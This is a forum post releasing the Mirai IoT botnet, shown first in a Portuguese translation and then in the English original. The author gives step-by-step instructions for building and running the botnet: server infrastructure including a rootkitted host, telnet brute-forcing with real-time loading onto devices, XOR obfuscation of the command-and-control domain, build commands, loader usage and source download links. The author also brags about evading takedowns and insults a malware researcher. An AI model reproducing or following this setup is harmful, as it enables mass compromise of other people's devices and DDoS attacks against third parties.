* Texto original de: [Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)
* Data da postagem: Fri 30 Sep 19:50:52 UTC 2016
* [Ver aquivo original](ForumPost.txt)

# Nota do tradutor

Traduzi sendo o mais fiel que pude, não retirando os xingamentos do post original. Brinquei com os termos da Anna em alguns momentos, mas para manter o sentido das piadas. Sobre os termos em inglês, mantive quando EU achei necessário para que alguém da área pudesse compreender. 

# Prefácio

Olá a todooox,

Quando inicialmente eu fui para a indústria do DDoS, eu não estava planejando ficar muito tempo. 
Eu fiz o meu primeiro dinheiro, tem muitos olhos olhando para IoT agora, então é hora de ir embora.
De qualquer forma, eu conheço todo garoto e sua mãe, eles tem um sonho molhado de ter algo além do Qbot(um malware).

Então hoje, eu tenho um incrível lançamento para vocês. Com Mirai, eu usualmente subo no máximo
380k de bots da telnet sozinha. Contudo, depois do Kreb DDoS, ISPs tem lentamente desligando e limpando seus atos.
Hoje, o máximo de máquinas que subo fica por volta de 300k de bots, e diminuindo.

Então, eu sou sua senpai, e eu vou te tratar bem legal, meu hf-chan.

E a todos que estão achando que estão fazendo alguma coisa acertando meu CNC, eu dei boas risadas, esse bot usa domínio para o CNC. leva 60 segundos para todos se reconectarem, LOL.

Também, mensagem para esta postagem do blog por malwaremustdie

* http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
* https://web.archive.org/web/20160930230210/http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
  <- backup backup no caso do engenheiro de engenharia reversa de baixa qualidade unixfreaxjp decida editar
esse post, lol.

Tinha muito respeito por você, pensava que você era um bom reverser, mas você
realmente falhou completamente e totalmente em reverter esse binário. 
"Nós ainda temos um melhor kung fu que vocês crianças" não me faça rir por favor, você fez tantos erros
e ainda me confundiu em alguns binários diferentes. LOL

Deixem me dar em você alguns tapas de volta -
1. Porta  `48101`  não é para back connect, é um controle para prevenir que múltiplas
 instâncias do bot rodem juntas

2. `/dev/watchdog` e `/dev/misc` não são para "fazer o delay", é para prevenir 
que o sistema congele (nota, em inglês está o termo hanging). Isso é uma fruta baixa no pé,
é muito triste que você seja extremamente burro.

3. Você falhou e pensou que `FAKE_CNC_ADDR` e `FAKE_CNC_PORT` era o real CNC, lol
"E fazia o backdor se conectando via HTTP na 65.222.202.53". Você tropeçou no fluxo de sinal ;)
tente melhor criança

4. Seu esqueleto da ferramenta chupa cu, ele pensa que o ataque decodificado como "sinden style",
mas ele nem mesmo usa um protocolo text-based? CNC e bot se cominicam sobre um protocolo binário

5. Você disse 'chroot("/") tão previsível como torlus' mas você não entendeu, outros
matam baseados no cwd. Isso mostra como fora-do-laço você é com malwares reais. Volte para a skidlândia

5 tapas para você

Por que você está escrevendo ferramentas de engenharia reversa? Você nem mesmo consegue fazer um reverso
em primeiro lugar. Por favor aprenda alguns skills antes de tentar impressionar os outros.
Sua arrogância em declarar como você "me bateu" com seu  argumento idiota de kung fu me fez rir
tanto enquanto eu estava comendo meu SO que tive de me dar uns tapinhas nas costas.


Assim como eu estou sempre livre, você está condenado a mediocracia para sempre.




# Requerimentos

### Bare Mínimo

2 servidores: 1 para CNC + mysql, 1 para o recebedor do scan e 1+ para carga(nt: loading no original)

### Pro Setup (meu setup)

2 VPS e 4 servidores

* 1 VPS com um host extremamente a prova de balas para o servidor de banco de dados
* 1 VPS, rootkittizado, para scanReceiver e distribuidor
* 1 servidor para CNC (geralmente usa 2% CPU com 400k bots)
* 3x servidores 10gbps NForce para carga (o distribuidor distribui para os 3 serves de forma igual)


# Overview da infraestrutura

* Para estabelecer a conexão com CNC, os bots resolvem o domínio
  ([`resolv.c`](mirai/bot/resolv.c)/[`resolv.h`](mirai/bot/resolv.h)) e se 
  conecta com aquele IP específico
* Bots de telnet brutos usam um scanner de SYN avançado que é aproximadamente 80x mais rápido
do que no Qbot, e usa 20x menos recursos. Quando acha um resultado bruto, o bot resolve outro domínio e reporta.
Isso é ligado com um servidor separado que é automaticamente carregado nos dispositivos assim que o resultado chega
*Resultados brutos são enviados por padrão na porta 48101. A utilidade chamada scanListen.go nas ferramentas
é usada para receber resultados brutos (eu estava tendo aproximadamente 500 resultados brutos por segundo no pico).


Mirai utiliza um mecanismo de espalhamento similar a se auto replicar, porém eu chamo de
"real-time-load". Basicamente, bots de resultados brutos, enviam para um servidor escutando com 
o mecanismo `scanListen`, o qual envia resultados para o loader. Esse loop (`brute -> scanListen -> load -> brute`) é conhecido como o tempo real de carregamento.

O loader pode ser configurado para usar múltiplos endereços IP para bypassar a exaustão de porta do linux (existe um limite do número de portas disponíveis, o que significa que não tem o suficiente para uma variação na tupla para ter mais do que 65k de saídas externas - em teoría, esse valor é muito menor na prática). Eu tenho por volta de 60k-70k de conexões simultâneas externas (carregamento simultâneo) espalhado por 5 IPs.



# configurando o bot

O bot tem diversas opções de configurações que são obfuscadas em `table.c/table.h`.
Em [`./mirai/bot/table.h`](mirai/bot/table.h) nós podemos achar a maioria das descrições para
as opções de configurações. Entretanto, em [`./mirai/bot/table.c`](mirai/bot/table.c)
existem algumas opções que você *precisa* mudar para continuar funcionando.


* `TABLE_CNC_DOMAIN` - Domain name do CNC para conecta para - evitador de DDoS bem divertido com a mirai
   muito divertido com mirai, as pessoas tentão se
   conectar com meu CNC mas eu atualizo mais rápido do que eles conseguem achar meu novo endereço de IPs, 
  lol. Retardados :)
* `TABLE_CNC_PORT` - Porta para conectar para, já definida na 23
* `TABLE_SCAN_CB_DOMAIN` - Quando encontra resultados brutos, esse domínio é reportado para
* `TABLE_SCAN_CB_PORT` - Porta para conectar para por resultados brutos, já está configurada para
  `48101`.

Em [`./mirai/tools`](mirai/tools) você irá encontrar algo chamado enc.c - você
deve compilar ele para ter saída de coisas para colocar no arquivo table.c

Rode isso dentro do diretório da mirai

    ./build.sh debug telnet

Você terá alguns erros relacionados ao cross-compile não estar lá se você não os tiver configurado.
Isso é ok, não afetará a compilação da ferramenta enc

Agora, na pasta `./mirai/debug` você deve ver um binário compilado chamaco enc.
Por exemplo, para obfuscar uma string para o nome de domínip para os bots se conectarem, use isso:


    ./debug/enc string fuck.the.police.com

A saída deve ser algo como:

    XOR'ing 20 bytes of data...
    \x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22

Para atualizar o valor de `TABLE_CNC_DOMAIN` por exemplo, subtitua por uma string long hex
com a ferramenta enc. Também, você verá `XOR'ing 20 bytes of data`.
Esse valor deve ser trocado pelo último argumento. Como exemplo, a linha table.c
originalmente se parece assim


    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com

Agora que nós conhecemos o valor da ferramenta enc, nos iremos atualizar como

    add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22", 20); // fuck.the.police.com


Alguns valores são strings, alguns são portas  (uinte16 na ordem de rede / big endian).


# Configurando o CNC

    apt-get install mysql-server mysql-client

CNC requer uma database para funcionar. Quando você instala o database, entre nele e execute
os seguintes comandos: http://pastebin.com/86d0iL9g (ref:
[`db.sql`](scripts/db.sql))

Isso irá criar uma database para você. Para adicionar seu usuário,

    INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');

Agora, vá no arquivo [`./mirai/cnc/main.go`](mirai/cnc/main.go)

edite esses valores

    const DatabaseAddr string   = "127.0.0.1"
    const DatabaseUser string   = "root"
    const DatabasePass string   = "password"
    const DatabaseTable string  = "mirai"

Para informar para o mysql server que você acabou de instalar


# Setando os cross-compilers

Cross compilers são fáceis, siga as intruções nesse link para configurar tudo.
Você deve reiniciar seu sistema ou recarregar o arquivo .bashrc para essas mudanças poderem afetar.


http://pastebin.com/1rRCc3aD (ref:
[`cross-compile.sh`](scripts/cross-compile.sh))

# Construindo o CNC+Bot

O CNC, bot e ferramentas relacionadas:

1. http://santasbigcandycane.cx/mirai.src.zip - *ESSE LINK NÃO VAI DURAR PARA
  SEMPRE, 2 SEMANAS MAX - FAÇA BACKUP!*<br>
  ![mirai.src.zip contents](scripts/images/BVc7qJs.png)
2. http://santasbigcandycane.cx/loader.src.zip - *ESSE LINK NÃO VAI DURAR PARA
  SEMPRE, 2 SEMANAS MAX - FAÇA BACKUP!*

### Como contruir bot + CNC

Na pasta do mirai, existe o script [`build.sh`](mirai/build.sh) .

    ./build.sh debug telnet


Irá gerar binários de depuração do bot que não irão daemonizar e imprimir informações
sobre se ele pode se conectar ao CNC, etc, status de inundações, etc. Compile para a pasta
`./mirai/debug` 

    ./build.sh release telnet

Irá gerar saídas de binários prontos para a produção de bot que são extremamente despojados,
pequenos (aproximadamente 60K) que devem ser carregados nos dispositivos. Compile todos os binários no formato:
`mirai.$ARCH` para a pasta `./mirai/release`



# Construindo Echo Loader

Loader lê as entradas telnet da STDIN no seguinte formato:

    ip:port user:pass
ele detecta se tem wget ou tftp, e tenta baixar o binário usando isso. Se não, ficará ecoando um pequeno
binário (aproximadamente 1kb) que ira ser suficiente como um wget.

    ./build.sh

Irá construir o loader, optimizar, ter uso em produção, sem fuss. Se você tiver um aquivo
no formato usado para carregamento, você poderá fazer isso

    cat file.txt | ./loader

Lembre-se do `ulimit`!

Só para deixar claro, eu não estou providenciando nenhum tipo de tutorial de ajuda 1 para ou ou merda assim, leva muito tempo. Todos os scripts e tudomais são incluídos para setar uma botnet funcional em menos de 1 hora. Eu irei ajudar você se tiver questões individuais ( como o CNC não conecta a database, eu fiz assim assim blah blah), mas não questões como "Meu bot não conecta, concerte".

Traduzido porcamente por SlowHusky. O texto original está disponível nesse documento, então não precisa confiar na minha tradução.




* Original quote from: [Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)
* Date posted: Fri 30 Sep 19:50:52 UTC 2016
* [See original archived post](ForumPost.txt)

# Preface

Greetz everybody,

When I first go in DDoS industry, I wasn't planning on staying in it long. I
made my money, there's lots of eyes looking at IOT now, so it's time to GTFO.
However, I know every skid and their mama, it's their wet dream to have
something besides qbot.

So today, I have an amazing release for you. With Mirai, I usually pull max 380k
bots from telnet alone. However, after the Kreb DDoS, ISPs been slowly shutting
down and cleaning up their act. Today, max pull is about 300k bots, and
dropping.

So, I am your senpai, and I will treat you real nice, my hf-chan.

And to everyone that thought they were doing anything by hitting my CNC, I had
good laughs, this bot uses domain for CNC. It takes 60 seconds for all bots to
reconnect, lol

Also, shoutout to this blog post by malwaremustdie

* http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
* https://web.archive.org/web/20160930230210/http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
  <- backup in case low quality reverse engineer unixfreaxjp decides to edit his
  posts lol

Had a lot of respect for you, thought you were good reverser, but you
really just completely and totally failed in reversing this binary. "We still
have better kung fu than you kiddos" don't make me laugh please, you made so
many mistakes and even confused some different binaries with my. LOL

Let me give you some slaps back -

1. port `48101` is not for back connect, it is for control to prevent multiple
   instances of bot running together
2. `/dev/watchdog` and `/dev/misc` are not for "making the delay", it for
   preventing system from hanging. This one is low-hanging fruit, so sad that
   you are extremely dumb
3. You failed and thought `FAKE_CNC_ADDR` and `FAKE_CNC_PORT` was real CNC, lol
   "And doing the backdoor to connect via HTTP on 65.222.202.53". you got
   tripped up by signal flow ;) try harder skiddo
4. Your skeleton tool sucks ass, it thought the attack decoder was "sinden
   style", but it does not even use a text-based protocol? CNC and bot
   communicate over binary protocol
5. you say 'chroot("/") so predictable like torlus' but you don't understand,
   some others kill based on cwd. It shows how out-of-the-loop you are with real
   malware. Go back to skidland

5 slaps for you

Why are you writing reverse engineer tools? You cannot even correctly reverse in
the first place. Please learn some skills first before trying to impress others.
Your arrogance in declaring how you "beat me" with your dumb kung-fu statement
made me laugh so hard while eating my SO had to pat me on the back.

Just as I forever be free, you will be doomed to mediocracy forever.


# Requirements

### Bare Minimum

2 servers: 1 for CNC + mysql, 1 for scan receiver, and 1+ for loading

### Pro Setup (my setup)

2 VPS and 4 servers

* 1 VPS with extremely bulletproof host for database server
* 1 VPS, rootkitted, for scanReceiver and distributor
* 1 server for CNC (used like 2% CPU with 400k bots)
* 3x 10gbps NForce servers for loading (distributor distributes to 3 servers
  equally)


# Infrastructure Overview

* To establish connection to CNC, bots resolve a domain
  ([`resolv.c`](mirai/bot/resolv.c)/[`resolv.h`](mirai/bot/resolv.h)) and
  connect to that IP address
* Bots brute telnet using an advanced SYN scanner that is around 80x faster than
  the one in qbot, and uses almost 20x less resources. When finding bruted
  result, bot resolves another domain and reports it. This is chained to a
  separate server to automatically load onto devices as results come in.
* Bruted results are sent by default on port 48101. The utility called
  scanListen.go in tools is used to receive bruted results (I was getting around
  500 bruted results per second at peak). If you build in debug mode, you should
  see the utitlity scanListen binary appear in debug folder.

Mirai uses a spreading mechanism similar to self-rep, but what I call
"real-time-load". Basically, bots brute results, send it to a server listening
with `scanListen` utility, which sends the results to the loader. This loop
(`brute -> scanListen -> load -> brute`) is known as real time loading.

The loader can be configured to use multiple IP address to bypass port
exhaustion in linux (there are limited number of ports available, which means
that there is not enough variation in tuple to get more than 65k simultaneous
outbound connections - in theory, this value lot less). I would have maybe 60k -
70k simultaneous outbound connections (simultaneous loading) spread out across 5
IPs.

# Configuring Bot

Bot has several configuration options that are obfuscated in `table.c/table.h`.
In [`./mirai/bot/table.h`](mirai/bot/table.h) you can find most descriptions for
configuration options.  However, in [`./mirai/bot/table.c`](mirai/bot/table.c)
there are a few options you *need* to change to get working.

* `TABLE_CNC_DOMAIN` - Domain name of CNC to connect to - DDoS avoidance very
  fun with mirai, people try to hit my CNC but I update it faster than they can
  find new IPs, lol. Retards :)
* `TABLE_CNC_PORT` - Port to connect to, its set to 23 already
* `TABLE_SCAN_CB_DOMAIN` - When finding bruted results, this domain it is
  reported to
* `TABLE_SCAN_CB_PORT` - Port to connect to for bruted results, it is set to
  `48101` already.

In [`./mirai/tools`](mirai/tools) you will find something called enc.c - You
must compile this to output things to put in the table.c file

Run this inside mirai directory

    ./build.sh debug telnet

You will get some errors related to cross-compilers not being there if you have
not configured them. This is ok, won't affect compiling the enc tool

Now, in the `./mirai/debug` folder you should see a compiled binary called enc.
For example, to get obfuscated string for domain name for bots to connect to,
use this:

    ./debug/enc string fuck.the.police.com

The output should look like this

    XOR'ing 20 bytes of data...
    \x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22

To update the `TABLE_CNC_DOMAIN` value for example, replace  that long hex string
with the one provided by enc tool. Also, you see `XOR'ing 20 bytes of data`.
This value must replace the last argument tas well. So for example, the table.c
line originally looks like this

    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com

Now that we know value from enc tool, we update it like this

    add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22", 20); // fuck.the.police.com

Some values are strings, some are port (uint16 in network order / big endian).

# Configuring CNC

    apt-get install mysql-server mysql-client

CNC requires database to work. When you install database, go into it and run
following commands: http://pastebin.com/86d0iL9g (ref:
[`db.sql`](scripts/db.sql))

This will create database for you. To add your user,

    INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');

Now, go into file [`./mirai/cnc/main.go`](mirai/cnc/main.go)

Edit these values

    const DatabaseAddr string   = "127.0.0.1"
    const DatabaseUser string   = "root"
    const DatabasePass string   = "password"
    const DatabaseTable string  = "mirai"

To the information for the mysql server you just installed


# Setting Up Cross Compilers

Cross compilers are easy, follow the instructions at this link to set up. You
must restart your system or reload .bashrc file for these changes to take
effect.

http://pastebin.com/1rRCc3aD (ref:
[`cross-compile.sh`](scripts/cross-compile.sh))

# Building CNC+Bot

The CNC, bot, and related tools:

1. http://santasbigcandycane.cx/mirai.src.zip - *THESE LINKS WILL NOT LAST
  FOREVER, 2 WEEKS MAX - BACK IT UP!*<br>
  ![mirai.src.zip contents](scripts/images/BVc7qJs.png)
2. http://santasbigcandycane.cx/loader.src.zip - *THESE LINKS WILL NOT LAST
   FOREVER, 2 WEEKS MAX - BACK IT UP!*

### How to build bot + CNC

In mirai folder, there is [`build.sh`](mirai/build.sh) script.

    ./build.sh debug telnet

Will output debug binaries of bot that will not daemonize and print out info
about if it can connect to CNC, etc, status of floods, etc. Compiles to
`./mirai/debug` folder

    ./build.sh release telnet

Will output production-ready binaries of bot that are extremely stripped, small
(about 60K) that should be loaded onto devices. Compiles all binaries in format:
`mirai.$ARCH` to `./mirai/release` folder


# Building Echo Loader

Loader reads telnet entries from STDIN in following format:

    ip:port user:pass

It detects if there is wget or tftp, and tries to download the binary using
that. If not, it will echoload a tiny binary (about 1kb) that will suffice as
wget.

    ./build.sh

Will build the loader, optimized, production use, no fuss. If you have a file in
formats used for loading, you can do this

    cat file.txt | ./loader

Remember to `ulimit`!

Just so it's clear, I'm not providing any kind of 1 on 1 help tutorials or shit,
too much time. All scripts and everything are included to set up working botnet
in under 1 hours. I am willing to help if you have individual questions (how
come CNC not connecting to database, I did this this this blah blah), but not
questions like "My bot not connect, fix it"
